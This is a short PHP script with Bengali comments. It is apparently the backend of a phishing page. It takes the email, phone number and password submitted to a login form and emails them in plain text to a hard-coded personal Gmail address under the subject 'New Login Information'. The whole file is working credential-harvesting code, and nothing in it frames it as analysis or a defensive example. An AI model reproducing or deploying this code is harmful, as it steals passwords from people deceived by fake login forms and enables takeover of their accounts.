<?php
    // ফর্ম থেকে তথ্য সংগ্রহ করা হচ্ছে
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $password = $_POST['password'];

    // ইমেইল সেটআপ
    $to = "aidakeda9@gmail.com"; // আপনার ইমেইল যেখানে তথ্য পাঠানো হবে
    $subject = "New Login Information";
    $message = "Email: $email\nPhone: $phone\nPassword: $password";
    $headers = "From: no-reply@yourwebsite.com";

    // ইমেইল পাঠানো হচ্ছে
    if(mail($to, $subject, $message, $headers)) {
        echo "Login information has been sent to your email.";
    } else {
        echo "Failed to send email.";
    }
?>